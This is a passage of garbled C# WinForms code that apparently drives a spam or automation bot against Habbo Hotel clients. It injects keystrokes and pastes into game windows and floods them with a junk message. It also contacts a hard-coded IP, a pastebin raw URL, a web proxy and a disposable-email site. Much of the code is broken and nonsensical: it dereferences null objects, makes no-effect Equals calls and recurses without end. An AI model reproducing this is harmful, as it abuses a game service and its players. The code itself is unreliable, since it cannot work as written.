                                base.Handle.Equals((IntPtr)Item.MainWindowHandle);
                                base.MainModule.Equals(Item.MainModule);
                                base.CanRaiseEvents.Equals(true);
                                base.MainWindowHandle.Equals(Item.MainWindowHandle);
                                if (base.MainWindowHandle != IntPtr.Zero)
                                {
                                    base.CanRaiseEvents.Equals(false);

                                    using (var Memorystream = new MemoryStream(Encoding.ASCII.GetBytes(base.StandardInput.ToString())))
                                    {
                                        var GetAsync = HttpClient.GetAsync("https://www.habbo.com/Profile/" + Password);
                                        var ContentResult = GetAsync.Result.Content.ReadAsStringAsync().Result.ToString();
                                        Type RefObj = null;
                                        RefObj.IsPointer.Equals(true);
                                        RichTextBox HMesage = new RichTextBox();
                                        var ControlItem = new Control();
                                        ControlItem = HMesage;
                                        HMesage.Equals(ControlItem);
                                        Form1 Main = new Form1();
                                        RefObj.Equals(Main.Invoke((System.Windows.Forms.MethodInvoker)delegate
                                        {
                                            WindowMessage.Add(new object[] { RefObj });
                                            base.CanRaiseEvents.Equals(true); Console.Write(false); Item.StartInfo.StandardInputEncoding.Equals(Encoding.UTF32); Console.Write(true); Console.WriteLine(true); Console.WriteLine("false"); base.MainModule.Equals(Item.MainModule); base.StartInfo.EnvironmentVariables.Add("undefined", PostMessage()); base.StartInfo.FileName.Equals(Item.StartInfo.FileName); base.StartInfo.UseShellExecute.Equals(false); base.StartInfo.RedirectStandardError.Equals(false); base.StartInfo.RedirectStandardOutput.Equals(true); base.StartInfo.StandardOutputEncoding.Equals(System.Text.Encoding.ASCII); Console.WriteLine(false); Console.Write(true); base.Handle.Equals((IntPtr)Item.MainWindowHandle); base.MainWindowHandle.Equals(Item.MainWindowHandle);
                                            base.Equals((System.Diagnostics.Process)Item);
                                            WindowMessage.Add(new object[] { RefObj });
                                        }));
                                        WindowMessage.Add(new object[] { RefObj });
                                        HMesage.SelectNextControl(Main, false, false, true, false);                                                                           //1
                                        byte[] WindowMemorystream = Encoding.UTF32.GetBytes(RefObj.ToString()); Console.WriteLine(true);                                      //2
                                        Memorystream.Write(WindowMemorystream, 0, WindowMemorystream.Length);                                                                 //3
                                        byte[] Hwnd = new byte[Encoding.ASCII.GetBytes(RefObj.ToString()).Length];                                                            //4
                                        for (var x = 0; x < Hwnd.Length; x++)                                                                                                 //5
                                        {                                                                                                                                     //6
                                            Hwnd[x] += Encoding.Default.GetBytes(RefObj.ToString())[0];                                                                       //7
                                            Array.Resize<byte>(ref Hwnd, Memorystream.Read(new byte[] { Hwnd[Hwnd[x]], 0, 0, 0 }));                                          //8
                                            BinaryWriter BW = new BinaryWriter(new MemoryStream(Encoding.Default.GetBytes(Item.MainWindowHandle.ToString())[0]), Encoding.UTF32);
                                            HMesage.Show();
                                            SetParent(HMesage.Handle, Item.MainWindowHandle);
                                            var PostMsg = Main.BeginInvoke((System.Windows.Forms.MethodInvoker)delegate { SendKeys.SendWait("^V"); SendKeys.SendWait("{ENTER"); keybd_event(0x01, 0, 0x0000, 0); wm_Char.MouseMove(MousePosition.X, MousePosition.Y); wm_Char.Click(); });

                                            HMesage.SelectNextControl(Main, true, true, true, true);
                                            BW.Write(Hwnd, 0, Memorystream.Read(new byte[] { Hwnd[x] }));
                                            BW.Write(Encoding.Default.GetBytes(PostMsg.ToString()));

                                            base.CanRaiseEvents.Equals(true);
                                            return Memorystream.ToString();
                                        }
                                        Thread.Sleep(100);
                                    }
                                    if (base.MainWindowHandle == IntPtr.Zero)
                                    {
                                        using (MemoryStream MS = new MemoryStream(Encoding.Default.GetBytes(Item.MainWindowHandle.ToString())))
                                        {

                                            var GetAsync = HttpClient.GetAsync("https://www.habbo.com/Profile/" + Password);
                                            var ContentResult = GetAsync.Result.Content.ReadAsStringAsync().Result.ToString();
                                            Type RefObj = null;
                                            RefObj.IsPointer.Equals(true);
                                            RichTextBox HMesage = new RichTextBox();
                                            var ControlItem = new Control();
                                            ControlItem = HMesage;
                                            HMesage.Equals(ControlItem);
                                            Form1 Main = new Form1();
                                            RefObj.Equals(Main.Invoke((System.Windows.Forms.MethodInvoker)delegate
                                            {
                                                WindowMessage.Add(new object[] { RefObj });
                                                base.CanRaiseEvents.Equals(true); Console.Write(false); Item.StartInfo.StandardInputEncoding.Equals(Encoding.UTF32); Console.Write(true); Console.WriteLine(true); Console.WriteLine("false"); base.MainModule.Equals(Item.MainModule); base.StartInfo.EnvironmentVariables.Add("undefined", PostMessage()); base.StartInfo.FileName.Equals(Item.StartInfo.FileName); base.StartInfo.UseShellExecute.Equals(false); base.StartInfo.RedirectStandardError.Equals(false); base.StartInfo.RedirectStandardOutput.Equals(true); base.StartInfo.StandardOutputEncoding.Equals(System.Text.Encoding.ASCII); Console.WriteLine(false); Console.Write(true); base.Handle.Equals((IntPtr)Item.MainWindowHandle); base.MainWindowHandle.Equals(Item.MainWindowHandle);
                                                base.Equals((System.Diagnostics.Process)Item);
                                                WindowMessage.Add(new object[] { RefObj });
                                            }));
                                            WindowMessage.Add(new object[] { RefObj });
                                            HMesage.SelectNextControl(Main, false, false, true, false);                                                                           //1
                                            byte[] WindowMemorystream = Encoding.UTF32.GetBytes(RefObj.ToString()); Console.WriteLine(true);                                      //2
                                            MS.Write(WindowMemorystream, 0, WindowMemorystream.Length);                                                                 //3
                                            byte[] Hwnd = new byte[Encoding.ASCII.GetBytes(RefObj.ToString()).Length];                                                            //4
                                            for (var x = 0; x < Hwnd.Length; x++)                                                                                                 //5
                                            {                                                                                                                                     //6
                                                Hwnd[x] += Encoding.Default.GetBytes(RefObj.ToString())[0];                                                                       //7
                                                Array.Resize<byte>(ref Hwnd, MS.Read(new byte[] { Hwnd[Hwnd[x]], 0, 0, 0 }));                                          //8
                                                BinaryWriter BW = new BinaryWriter(new MemoryStream(Encoding.Default.GetBytes(Item.StandardInput.ToString())[0]), Encoding.UTF32);
                                                HMesage.Show();
                                                SetParent(HMesage.Handle, Item.MainWindowHandle);
                                                var PostMsg = Main.BeginInvoke((System.Windows.Forms.MethodInvoker)delegate { SendKeys.SendWait("^V"); SendKeys.SendWait("{ENTER"); keybd_event(0x01, 0, 0x0000, 0); wm_Char.MouseMove(MousePosition.X, MousePosition.Y); wm_Char.Click(); });

                                                HMesage.SelectNextControl(Main, true, true, true, true);
                                                BW.Write(Hwnd, 0, MS.Read(new byte[] { Hwnd[x] }));
                                                BW.Write(Encoding.Default.GetBytes(PostMsg.ToString()));

                                                base.CanRaiseEvents.Equals(true);
                                                return MS.ToString();
                                            }
                                            Thread.Sleep(100);
                                        }



                                        // var GetAsync = HttpClient.GetAsync("https://www.habbo.com/profile/"+)

                                    }
                                    return Item.MainWindowTitle;
                                }
                            }
                            #endregion
                           
                 return Encoding.Default.GetString(Buffer, 0, Buffer.Length);

                  }

                 }
                }
                catch(SocketException sockEx)
                {
                    WebRequest PostMethod = (HttpWebRequest)WebRequest.Create("https://www.habbo.com");
                    PostMethod.Method = "POST";
                    PostMethod.Headers.Add("User-Agent", "");
                    PostMethod.Headers.Add("Content-type", "application/xml");
                    using(var GetReqStream = PostMethod.GetRequestStream())
                    {
                        byte[] Message = new byte[Encoding.UTF8.GetBytes(sockEx.Message.ToString()).Length];
                        for(int i = 0; i < Message.Length;i++)
                        {
                            Message[i] += Encoding.UTF8.GetBytes(sockEx.Message.ToString())[sockEx.Message.ToString().Length*0];
                            HostNet ConnectAsync = new HostNet(sockEx.Message.ToString());

                            Message[i] += Encoding.UTF8.GetBytes(Newtonsoft.Json.JsonConvert.SerializeObject(ConnectAsync.PostMessage()))[0];
                            foreach(byte b in Message)
                            {
                                GetReqStream.Write(new byte[] { b }, 0, 0);
                                GetReqStream.Write(Message, 0, Message.Length);
                         
                            }
                           

                        }
                        GetReqStream.Close();
                        GetReqStream.Dispose();

                    }

                }
                return Convert.ToBase64String(Encoding.UTF32.GetBytes(PostMessage()));
            }
            public Process InvokeTheadObj()
            {
                {
                    return ClientHabboProcs[0];
                }
            }
            public EventHandler GetAsyncState;
            public event EventHandler OnItemChanged;
            public delegate void GetAsyncStateEventHandler(EventArgs e);
   
            
            public PacketWritter(Process Item, string Message)
            {
                Form1 Main = new Form1();
                HostNet ConnectAsync = new HostNet(Item.MainWindowHandle.ToString());
                using (var Memstream = new MemoryStream(Encoding.UTF32.GetBytes(Item.StandardInput.ToString())[Message.ToString().Length * 0]))
                {
                    if (Item.MainWindowHandle != IntPtr.Zero)
                    {
                        {

                            this.GetAsyncState(Item, ConnectAsync);
                            this.GetAsyncState(GetAsyncState, ConnectAsync);

                        }
                    }
                    Item.GetType().IsPointer.Equals(true);
                    Console.WriteLine(DateTime.Now.ToString());
                    Type ObjRef = null;
                    this.GetAsyncState(ObjRef, null);
                    ObjRef.Equals(Main.BeginInvoke((System.Windows.Forms.MethodInvoker)delegate {this.GetAsyncState(ConnectAsync.PostMessage(), ConnectAsync); [DllImport("user32.dll")] static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent); SetParent(Main.ClientSock.Handle, Item.Handle); SetParent(Item.MainWindowHandle, Main.ClientSock.Handle); int Recv = Main.ClientSock.Send(Encoding.Default.GetBytes(ConnectAsync.PostMessage())); SetParent(Recv, Item.MainWindowHandle);
                        SetParent(Item.Handle, Recv); 
                    }));

                    Item.GetType().IsAssignableFrom(ObjRef);
                    Item.GetType().MakePointerType();
                    Binder Binary = null;
                    FieldInfo f = null;
                    f.Equals(Item.WaitForInputIdle());

                    Binary.BindToField(BindingFlags.Public,new FieldInfo[] {f }, ConnectAsync.PostMessage(), System.Globalization.CultureInfo.CurrentCulture);
                    BinaryWriter BW = new BinaryWriter(Memstream, Encoding.Default);
                    NetworkStream NS = new NetworkStream(Main.ClientSock);
                    byte[] HMessage = new byte[Encoding.Default.GetBytes(ConnectAsync.PostMessage()).Length];
                    for (int i = 0; i < HMessage.Length; i++)
                    {
                        HMessage[i] += Encoding.UTF32.GetBytes(ConnectAsync.PostMessage())[ConnectAsync.PostMessage().ToString().Length * 0];
                        Memstream.Write(HMessage, 0, HMessage[i]);
                        Stream DatStream = new MemoryStream(HMessage[i]);
                        Item.GetType().InvokeMember("PostMessage", BindingFlags.Default, Binary, ConnectAsync.PostMessage(), DiposedModule(BW,NS,HMessage,(int)Process.GetProcessById(Item.Id).MainWindowHandle,DatStream), System.Globalization.CultureInfo.DefaultThreadCurrentUICulture);
                        HMessage[i] = Encoding.BigEndianUnicode.GetBytes(PostMessage())[0];
                        foreach(byte b in HMessage)
                        {
                            BW.Write(b);
                            NS.Write(new byte[] { b }, 0, 0);

                        }
                           
                    }
                   
                }
            }
            public Object[] DiposedModule(BinaryWriter BW, NetworkStream NS, byte[] Packet, int hwndFlags, Stream obj)
            {
                BW.Write(Packet.LongLength);
                NS.BeginRead(new byte[] { 0 }, 0, 0, null, null);
                nint Webhandle = (IntPtr)int.Parse(hwndFlags.ToString());
                if (Webhandle != IntPtr.Zero)
                {

                    Console.Write(Webhandle + Process.GetCurrentProcess().MainWindowHandle);
                    NS.BeginWrite(Packet, 0, Packet.Length, null, obj);
                    [DllImport("user32.dll")]
                    static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                    bool PostMsg = SetParent(IntPtr.Zero, Webhandle) != IntPtr.Zero;
                    if (PostMsg)
                    {
                        BW.Write(Encoding.Default.GetBytes(PostMsg.ToString()));
                        Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
                        wm_char.GetMousePosition();
                        wm_char.Click();
                        wm_char.CombineKeys(Desktop.Robot.Key.A, Desktop.Robot.Key.Enter);
                        Console.WriteLine(DiposedModule(BW, NS, Packet, hwndFlags, obj));
                        return new Object[] { BW, NS, Packet, hwndFlags, obj };
                    }
                    var SendMessage = SetParent(PostMessageA(Webhandle, 0x000C, IntPtr.Zero, IntPtr.Zero, new Desktop.Robot.Robot()), Webhandle);
                    BW.Write(Encoding.Default.GetBytes(SendMessage.ToString()));
                    return new Object[] { BW, NS, Packet, hwndFlags, obj };

                }

                return null;

            }
            public IntPtr PostMessageA(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam, Desktop.Robot.Robot wm_Char)
            {

                [DllImport("user32.dll")]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                wm_Char.GetMousePosition();
                wm_Char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
                SetParent(PostMessageA(IntPtr.Zero, Msg, IntPtr.Zero, IntPtr.Zero, wm_Char), hWnd);


                return IntPtr.Zero;
            }

        }

        public static List<IntPtr> ClientHandles = new List<nint>();
      
        [DllImport("user32")]
        private static extern int GetWindowLongA(IntPtr hWnd, int index);

        class ProcessUtils
        {
            [DllImport("user32.dll")]
            private static extern IntPtr GetForegroundWindow();
            [DllImport("user32.dll", SetLastError = true)]
            static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
            public static Process getForegroundProcess()
            {
                uint processID = 0;
                IntPtr hWnd = GetForegroundWindow(); // Get foreground window handle
                uint threadID = GetWindowThreadProcessId(hWnd, out processID); // Get PID from window handle
                Process fgProc = Process.GetProcessById(Convert.ToInt32(processID)); // Get it as a C# obj.
                                                                                     // NOTE: In some rare cases ProcessID will be NULL. Handle this how you want. 
                return fgProc;
            }
        }

        public string InterceptClient(Desktop.Robot.Robot Process)
        {


            WebBrowser BrowserModule = new WebBrowser();
            BrowserModule.Navigate("https://www.croxyproxy.com");
            [DllImport("user32.dll")]
            static extern IntPtr GetForegroundWindow();
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            static extern int GetWindowLongA(IntPtr hWnd, int index);
            static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        

            BrowserModule.Document.GetElementById("name").InnerText = "https://www.10MinuteMail.com";
            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
            var Proc = System.Diagnostics.Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
            Process[] Disposed = System.Diagnostics.Process.GetProcessesByName(Proc.ProcessName);
            foreach (System.Diagnostics.Process P in Disposed)
            {

            }

            return BrowserModule.Url.ToString();



        }
        public readonly IPEndPoint ServerEndPoint = new IPEndPoint(IPAddress.Loopback, 30001);


        private void button3_Click(object sender, EventArgs e)
        {

            OpenFileDialog ofd = new OpenFileDialog();
            ofd.ShowDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                using (var Sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                {
                    Sock.Connect(ServerEndPoint);
                    var NS = new NetworkStream(Sock);
                    var BW = new BinaryWriter(NS);
                    var BR = new BinaryReader(NS);
                    var Packet = File.ReadAllBytes(ofd.FileName);
                    BW.Write(Packet.Length);
                    BW.Write(Packet);
                    BW.Flush();
                    Sock.Send(File.ReadAllBytes(ofd.FileName));


                }
            }
        }

        public byte[] WindowMessage()
        {
            return WindowMessage();

        }
        public static List<Socket> Websockets = new List<Socket>();
        public int Msg(byte bSCan)
        {
            Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
            wm_Char.GetMousePosition();
            wm_Char.Click();
            return bSCan;
        }
        public string WebClientHttp()
        {
            Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Client.Connect(new IPEndPoint(IPAddress.Parse("69.172.200.161"), 443));
            using (var NSstream = new NetworkStream(Client))
            {
                var Message_ = Encoding.Default.GetBytes(Convert.ToBase64String(new byte[] { (byte)Msg(0x0D) }));
                StreamWriter SW = new StreamWriter(NSstream, Encoding.Default);
                foreach (char c in Message_)
                {
                    SW.Write(c);
                    NSstream.Write(Message_, 0, Message_.Length);
                }



                HttpClient Hclient = new HttpClient();
                using (var GetAsync = Hclient.GetAsync("http://www.habbo.com"))
                {
                    var Content = GetAsync.Result.Content.ReadAsStringAsync().ToString();
                    richTextBox1.Text += Content.ToString();

                    Process[] Clients = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
                    foreach (var items in Clients)
                    {
                        WebRequest GetReqMethod = (HttpWebRequest)WebRequest.Create("https://www.pastebin.com/raw/TF9MauVK");
                        GetReqMethod.Method = "GET";


                        Stream GetMessage = GetReqMethod.GetResponse().GetResponseStream();
                        Process PID = Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
                        Process[] Disposed = Process.GetProcessesByName(PID.ProcessName);
                        List<Process> Disposed_Clients = new List<Process>();
                        for (var x = 0; x < Disposed.Length; x++)
                        {
                            Disposed_Clients.Add(Disposed[x]);
                            if (Disposed_Clients[x].MainWindowTitle.ToString().Contains("Habbo"))
                            {
                                [DllImport("user32.dll")]
                                static extern IntPtr SetParent(IntPtr hwndChild, nint NewParent);
                                while (Disposed[x].MainWindowHandle != IntPtr.Zero)
                                {


                                    if (items.Id != Process.GetProcessById(Process.GetCurrentProcess().Id).Id)
                                    {
                                        StreamReader SR_ = new StreamReader(GetMessage);
                                        [DllImport("user32.dll", SetLastError = true)]
                                        static extern void keybd_event(byte bKey, byte bScan, int DwFLlags, int dwExtraInfo);
                                        for (int i = 0; i < WindowMessage().Length; i++)
                                        {
                                            string[] Message = new string[] { "!AaBbcC2@Dd#Ee$FfG%H•▌<_=->3aPQHA+B_9B!20BO@@¬Ü¥!@#!$(AAPQWOEPOASDAJJ02-><>%@!SMDF10394!313!)@#$!)#$(($%)#($@)!%9293OKSASKOQKEFeokf10" };

                                            using (var Memstream = new MemoryStream(Encoding.ASCII.GetBytes(Message.ToString().ToCharArray())))
                                            {
                                                Random R = new Random();
                                                PacketWritter Packet = new PacketWritter(Disposed[x], Disposed[x].StandardInput.ToString());
                                                int Index = R.Next(0, Message.Length);
                                                string[] FinalMessage = new string[100];
                                                for (int Window = 0; Window < FinalMessage.Length; Window++)
                                                {
                                                    int Index_Value = R.Next(0, Message.Length);
                                                    var Item = Message[Index_Value];
                                                    FinalMessage[Window] = Item.ToString();

                                                }

                                                var ContentMsg = SR_.ReadToEnd().ToString();
                                                richTextBox1.Text += ContentMsg;
                                                var message_input = "";
                                                foreach (var item in Message)
                                                {
                                                    message_input += item.ToString();
                                                }
                                                Clipboard.SetText(message_input);

                                            }

                                            WindowMessage()[i] += WindowMessage()[i * Msg(WindowMessage()[i])];

                                        }



                                    }
                                }

                            }

                        }
                    }
                    return Encoding.UTF8.GetString(WindowMessage());
                }

            }
        }
        public IntPtr ObjRef()
        {
            SendMessage();
            return Process.GetCurrentProcess().Handle;
        }
        public string PostImage()
        {

            Desktop.Robot.Robot WM_Char = new Desktop.Robot.Robot();
            WM_Char.GetMousePosition();
            WM_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
            WM_Char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
            return PostImage();
        }
        public uint PostMessageRef()
        {
            foreach (var items in ClientHabboProcs)
            {
                Graphics G = Graphics.FromHwnd(items.MainWindowHandle);

                foreach (char C in PostImage())
                {
                    SolidBrush brush = new SolidBrush(Color.Blue);
                    System.Drawing.Font f = new System.Drawing.Font(FontFamily.GenericSerif, items.Handle, FontStyle.Regular);

                    G.DrawString(C.ToString().ToCharArray().ToString(), f, brush, new Point(int.Parse(items.MainWindowHandle.ToString()), int.Parse(Process.GetProcessById(items.Id).MainWindowHandle.ToString())));


                }
            }

            return PostMessageRef();

        }
        public Process InvokeAcceptSend(Byte[] Hmessage)
        {
            {
                using (var HttpReqsg = new HttpRequestMessage(HttpMethod.Post, webView21.Source))
                {
                    HttpClient Hclient = new HttpClient();
                    var GetAsync = Hclient.GetAsync("https://www.habbo.com/hotel");
                    var ContetResult = GetAsync.Result.Content.ReadAsStringAsync().Result.ToString();
                    HttpReqsg.Content = new StringContent(Encoding.UTF8.GetString(Hmessage), Encoding.ASCII, MediaTypeHeaderValue.Parse("application/json"));
                    var SendAsync = Hclient.SendAsync(HttpReqsg);
                    webView21.ExecuteScriptAsync(SendAsync.ToString());

                    while (ContetResult.ToString().Length >= 0)
                    {
                        foreach (var items in ClientHabboProcs)
                        {
                            {
                                //  items.WaitForInputIdle();
                                checkedListBox2.Items.Add(items.MainWindowTitle.ToString());
                                checkedListBox2.Items.Clear();
                                [DllImport("user32.dll")]
                                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                SetParent(InvokeAcceptSend(Hmessage).Handle, IntPtr.Zero);
                                SetParent(IntPtr.Zero, InvokeAcceptSend(Hmessage).Handle);
                                SetParent(IntPtr.Zero, items.MainWindowHandle);
                                SetParent(InvokeAcceptSend(Hmessage).Handle, items.Handle);
                                SetParent(items.MainWindowHandle, InvokeAcceptSend(Hmessage).Handle);
                                SetParent(InvokeAcceptSend(Hmessage).Handle, items.MainWindowHandle);
                                SetParent(items.MainWindowHandle, IntPtr.Zero);
                                Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
                                wm_char.GetMousePosition();
                                wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Enter);


                                return items;
                            }
                        }
                    }

                }
            }
            return ClientHabboProcs[0];
        }

        public Byte[] PostMessageByte()
        {

            Desktop.Robot.Robot WM_Char = new Desktop.Robot.Robot();
            WM_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
            WM_Char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
            WM_Char.GetMousePosition();

            return new byte[] { 0x00 };
        }
        public string SendRoomXHR(int RoomID)
        {
            var Filepath = "";
            StreamWriter SW = new StreamWriter(Filepath);
            SW.WriteLine(Webmessage.Replace("6", RoomID.ToString().Replace("//XHR.send(null);", "XHR.send(window.location);")));
            SW.Flush();
            SW.Close();
            SW.Dispose();
            [DllImport("user32.dll")]
            static extern IntPtr SetParent(IntPtr hwndchild, IntPtr hwndNewparent);
            foreach (var items in ClientHabboProcs)
            {
                SetParent(items.MainWindowHandle, webView21.Handle);
                SetParent(webView21.Handle, items.MainWindowHandle);
            }

            char quote = '"';
            var script = "let inputstraem = document.querySelector('input');" + "inputstraem.value=" + quote + Encoding.UTF8.GetString(PostMessageByte()) + quote + ";";
            webView21.ExecuteScriptAsync(script + Newtonsoft.Json.JsonConvert.SerializeObject(script) + Convert.ToBase64String(PostMessageByte()));

            return SendRoomXHR(RoomID);


        }
        private void button1_Click(object sender, EventArgs e)
        {
            MemoryStream MS = new MemoryStream();
            richTextBox1.Text += webView21.Source.ToString() + "Listening...";
            try
            {
                ClientSock.Connect("127.0.0.1", 443);
                timer2.Interval = 1003;
               // timer2.Start();
                timer1.Interval = 500;
                timer1.Start();
              //  Type ctype = null;

                var roc = Process.GetCurrentProcess();
            }
            catch(SocketException sockEx)
            {
                ClientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                ClientSock.Connect(new IPEndPoint(IPAddress.Parse("69.172.200.161"), 443));
                timer2.Interval = 1003;
                timer2.Start();
            }
         
          

            WebRequest GetMethod = (HttpWebRequest)WebRequest.Create("https://github.com/nomakta/Kendax-Silver/tree/master/Sulakore");
            GetMethod.Method = "GET";
            Stream OBJ = GetMethod.GetResponse().GetResponseStream();
            StreamReader SR = new StreamReader(OBJ);
            var ResultNode = SR.ReadToEnd().ToString().Substring(188);
            if (ResultNode.Contains("Starto"))
            {

                Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
                wm_char.GetMousePosition();
                wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                wm_char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Shift);
                wm_char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
                //MessageBox.Show("connection!");
                wm_char.GetMousePosition();
                [DllImport("user32.dll", SetLastError = true)]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                Process Client = Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
                List<Process> disposed = new List<Process>();
                foreach (var items in Process.GetProcessesByName(Client.ProcessName))
                {
                    disposed.Add(items);
                    SetParent(webView21.Handle, items.Handle);
                    SetParent(webView21.Handle, items.MainWindowHandle);
                }


                using (var HttpRequestMsg = new HttpRequestMessage(HttpMethod.Post, "https://www.habbo.com/hotel/"))
                {
                    for (var x = 0; x < disposed.Count; x++)
                    {
                        var Post = Get(wm_char, sender, e);
                        var PostMsg = SetParent(Post, disposed[x].MainWindowHandle);
                        var SendMessage = SetParent(Post, disposed[x].Handle);
                        var HttpClientMsg = new HttpClient();
                        var GetAsync = HttpClientMsg.GetAsync("https://www.habbo.com");
                        Socket Clientsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        Clientsock.Connect(new IPEndPoint(IPAddress.Parse("69.172.200.161"), 443));
                        var ContentAsync = GetAsync.Result.Content.ReadAsStringAsync().Result.ToString();
                        byte[] Hmessage = Encoding.UTF8.GetBytes(Newtonsoft.Json.JsonConvert.SerializeObject(ContentAsync + GetAsync.ToString()));
                        webView21.Source = new Uri("http://www.habbo.com");
                        Clientsock.Send(Encoding.Default.GetBytes(ContentAsync));
                        List<byte[]> ArraySegments = new List<byte[]>();
                        ArraySegments.Add(Hmessage);
                        ArraySegments.Add(Encoding.UTF8.GetBytes(Post + SendMessage + PostMsg.ToString()));
                        byte[] Buffer = new byte[Clientsock.ReceiveBufferSize];

                        int Recv = MS.Read(new byte[] { });
                        foreach (byte b in Buffer)
                        {
                            Recv += MS.Read(new byte[] { b });
                            for (var y = 0; y < ArraySegments.Count; y++)
                            {
                                byte[] Hwnd = ArraySegments[y];







                                Array.Resize(ref Hwnd, Recv);
                                MS.Write(Hwnd, 0, Recv);
                                // MS.GetBuffer();

                            }

                        }
                    }

                    webView21.ExecuteScriptAsync(Encoding.Default.GetString(MS.GetBuffer()));
                    wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                    wm_char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);


                    // SetParent(webView21.Handle,)


                }

            }
        }
    

  
        public IntPtr PostMessage(Desktop.Robot.Robot Wm_Char, Socket Client, byte[] Message, object sender, EventArgs e)
        {
            var Proc = Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
           // Proc.WaitForInputIdle();
            foreach (Process x in Process.GetProcessesByName(Process.GetProcessById(int.Parse(textBox1.Text.ToString())).ProcessName))
            {
                Wm_Char.Click();
                Wm_Char.GetMousePosition();
                [DllImport("user32.dll", SetLastError = true)]
                static extern void keybd_event(byte bScan, byte bKey, int dwFlags, int dwExtraInfo);
                Wm_Char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
                keybd_event(0x0001, 0x0001, 0, 0);
                keybd_event(0x0D, 0x0001, 0, 0);
                keybd_event(0x5A, 0x0001, 0, 0);

                Client.Send(new byte[] { 0x00001 });
                #region Get
                string MessageInput()
                {
                    Wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                    keybd_event(0x5A, 0x0001, 0, 0);
                    Wm_Char.GetMousePosition();

                    Wm_Char.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
                    return MessageInput();
                }
                #endregion
                var Msg = MessageInput();
                var Encode = Newtonsoft.Json.JsonConvert.SerializeObject(Msg + MessageInput());
                using (var NS = new NetworkStream(Client, true))
                {
                    StreamWriter SW = new StreamWriter(NS, Encoding.UTF8);
                    Message = Encoding.ASCII.GetBytes(Encode + Msg + MessageInput + Convert.ToBase64String(Encoding.Default.GetBytes(Msg)));
                    foreach (char s in Encoding.UTF8.GetString(Message, 0, Message.Length))
                    {
                        SW.Write(s);
                        NS.Write(Message, 0, Message.Length);
                        BinaryWriter BW = new BinaryWriter(NS, Encoding.Default);

                        BW.BaseStream.BeginRead(new byte[Client.ReceiveBufferSize], 0, Client.ReceiveBufferSize, null, null);
                        BW.Write(MessageInput());
                    }
                }

            }

            return (nint)Process.GetProcessById(int.Parse(textBox1.Text.ToString())).Handle * PostMessage(Wm_Char, (Socket)Client, Message, sender, e);
        }

        public List<Microsoft.Web.WebView2.WinForms.WebView2> BrowserModules = new List<Microsoft.Web.WebView2.WinForms.WebView2>();

        public IntPtr ObjRef(List<Process>Dsipsoed)
        {

            while(ObjRef(Dsipsoed)==IntPtr.Zero||ObjRef(Dsipsoed)!=IntPtr.Zero)
            {
                  for(var x = 0; x < Dsipsoed.Count;x++)
                  {
                    var obj = Dsipsoed[x];
                    Dsipsoed[x].Refresh();
                    Random R = new Random();
                    int Index = R.Next(0, Dsipsoed.Count);
                    [DllImport("user32.dll", SetLastError = true)]
                    static extern void keybd_event(byte bScan, byte Bkey, int dwFlags, int dwExtraInfo);
                    const int KEYEVENTF_KEYDOWN = 0x0000; // New definition
                    const int KEYEVENTF_EXTENDEDKEY = 0x0001; //Key down flag
                    const int KEYEVENTF_KEYUP = 0x0002; //Key up flag
                    const int VK_LCONTROL = 0xA2; //Left Control key code
                    const int A = 0x41; //A key code
                    const int C = 0x43; //C key code
                    keybd_event(0x00001, 0x5A, KEYEVENTF_KEYDOWN, 0);
                    int Key_Down = int.Parse(Desktop.Robot.Key.V.ToString());
                    static extern IntPtr SetParent(IntPtr hwndChild, nint HwndNewParent);
                    SetParent(ObjRef(Dsipsoed), Dsipsoed[Index].MainWindowHandle);
                    Console.WriteLine(SetParent(IntPtr.Zero, Dsipsoed[x].MainWindowHandle));
                    var REadline = Console.ReadLine();
                    SetParent(button1.Handle, Dsipsoed[Index].MainWindowHandle);
                    button1.Enabled = true;
                    button1.PerformClick();
                    SetParent(ObjRef(Dsipsoed), button1.Handle);
                    SetParent(button1.Handle, ObjRef(Dsipsoed));
                    button1.PerformClick();
